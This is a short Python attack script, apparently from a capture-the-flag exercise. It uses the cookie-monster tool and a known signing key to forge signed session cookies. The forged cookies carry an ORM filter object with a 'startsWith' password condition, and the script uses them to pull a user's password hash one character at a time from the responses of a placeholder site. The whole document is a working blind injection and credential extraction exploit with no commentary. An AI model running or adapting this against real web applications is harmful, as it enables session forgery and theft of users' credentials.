
##
##

from pwn import *
import requests
import string
import os,sys,re

context.log_level = "error"

##
##

password = ""
chars = string.ascii_lowercase + string.digits
while True:
    for i in chars:
        hash = password + i
        with open("cookie.json", "w") as f:
            f.write('{"flashes": {"info": [], "error": [], "success": []}, "user":{"username":{"equals":"THING"}, "password":{"startsWith":"' + hash + '"}}}')

        p = process(["cookie-monster", "-e", "-f", "cookie.json", "-k", "xxxxxxxxxxxxxx", "-n", "download_session"])
        find = p.readuntil("download_session=")
        download_session = re.findall("[A-Za-z0-9=_-]+", p.recvline().decode())[0]
        find_sig = p.readuntil("download_session.sig=")
        download_session_sig = re.findall("[A-Za-z0-9=_-]+", p.recvline().decode())[0]
        cookies = {"download_session": download_session, "download_session.sig": download_session_sig}
        r = requests.get('http://thing.edu/home/', cookies=cookies)
        if "THING" in r.text:
            password = hash
            print(password)
            break
          
##
##
